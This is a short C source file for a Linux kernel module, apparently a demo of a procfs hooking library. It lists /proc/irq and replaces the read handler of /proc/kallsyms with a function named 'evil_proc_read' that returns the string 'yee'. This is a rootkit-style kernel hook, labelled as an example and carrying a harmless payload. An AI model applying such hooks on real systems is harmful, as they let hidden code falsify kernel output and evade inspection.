#include <linux/uaccess.h>
#include "hook.h"
#include "procfs_utils.h"

ssize_t evil_proc_read(struct file *file,
                       char __user *buf,
                       size_t len,
                       loff_t *off)
{
    int x = copy_to_user(buf, "yee", 3);
    if (!*off) {
        *off = 1;
        return 3;
    }
    return 0;
}


void example_init(void)
{
    // list file example
    proc_list_dir("/proc/irq");

    // hook example
    struct proc_dir_entry *kallsym_entry = proc_find_by_path("/proc/kallsyms");
    struct proc_ops *kallsym_ops = proc_get_ops(kallsym_entry);
    hook_start((unsigned long) kallsym_ops->proc_read,
               (unsigned long) evil_proc_read);
}

void example_exit(void)
{
    hook_release();
}